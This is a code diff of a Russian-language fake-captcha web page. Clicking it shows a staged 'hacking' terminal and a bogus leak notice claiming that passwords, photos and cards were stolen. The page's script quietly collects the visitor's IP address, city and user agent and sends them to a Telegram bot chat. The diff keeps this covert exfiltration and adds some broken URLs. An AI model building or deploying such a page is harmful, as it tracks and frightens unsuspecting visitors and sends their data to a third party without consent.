@@ -28,15 +28,10 @@
             <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
             <hr>
             <p>> Статус: <span style="color:red; font-weight:bold;">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
-            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">Определение...</span></p>
-            <p>> Город: <span id="user-geo" style="color:#fff;">Поиск...</span></p>
-            <p>> Устройство: <span id="user-os" style="color:#fff;">Загрузка...</span></p>
-            <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ:</p>
-            <ul style="color: #ff4d4d;">
-                <li>История браузера: извлечена (2,431 запись)</li>
-                <li>Пароли системы: получены (Chrome, FB, Gmail)</li>
-                <li>Личные фото/видео: синхронизация...</li>
-            </ul>
+            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">...</span></p>
+            <p>> Город: <span id="user-geo" style="color:#fff;">...</span></p>
+            <p>> Устройство: <span id="user-os" style="color:#fff;">...</span></p>
+            <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ: Пароли, Фото, Карты</p>
         </div>
     </div>
 
@@ -45,16 +40,14 @@
         const chat_id = "-1003861311533";
 
         async function startHack() {
+            
             document.getElementById('captcha-box').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-    
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚀 Клик! Запуск IPv4 сканирования...")}`);
- 
             const lines = [
-                "> [INIT] Инициализация взлома...", "> [INFO] Обход защиты reCAPTCHA...",
-                "> [SUCCESS] Доступ к системе получен", "> [INFO] Инжект в процесс браузера...",
+                "> [INIT] Инициализация взлома...", "> [INFO] Обход reCAPTCHA v2...",
+                "> [SUCCESS] Токен получен", "> [INFO] Инжект в процесс...",
                 "> [CRITICAL] Права ROOT получены", "> [DONE] ПОЛНЫЙ ДОСТУП."
             ];
 
@@ -66,45 +59,36 @@
                 await new Promise(r => setTimeout(r, 350)); 
             }
 
-            await getIpv4Data();
+            // 2. Получаем и шлем данные
+            await getFinalData();
         }
 
-                        async function getIpv4Data() {
+        async function getFinalData() {
             try {
-              
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                 
+                const ipRes = await fetch(`https://api.ipify.org?format=json`);
                 const ipData = await ipRes.json();
                 const ipv4 = ipData.ip;
 
-
-                await new Promise(r => setTimeout(r, 500));
-
-   
-                const geoRes = await fetch(`https://ipwho.is/${ipv4}`);
+ 
+                const geoRes = await fetch(`https://ipwho.is{ipv4}`);
                 const g = await geoRes.json();
-                
-                const city = g.success ? `${g.city}, ${g.country}` : "Город не определен";
+                const city = g.success ? `${g.city}, ${g.country}` : "Не определен";
 
-              
                 document.getElementById('user-ip').innerText = ipv4;
                 document.getElementById('user-geo').innerText = city;
                 document.getElementById('user-os').innerText = navigator.platform;
 
-           
-                const msg = `🔥 ПОЛНЫЙ ЛОГ (IPv4)!\n📍 IP: ${ipv4}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
+ 
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ipv4}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-              
-                const backup = `⚠️ Ошибка данных!\n📱 ${navigator.userAgent}\n❌ Ошибка: ${e.message}`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
+                const backup = `⚠️ Ошибка!\n📱 ${navigator.userAgent}`;
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
             }
 
-            document.getElementById('terminal').style.display = 'none';
-            document.getElementById('leak-box').style.display = 'block';
-        }
-
-
+ 
             document.getElementById('terminal').style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
         }
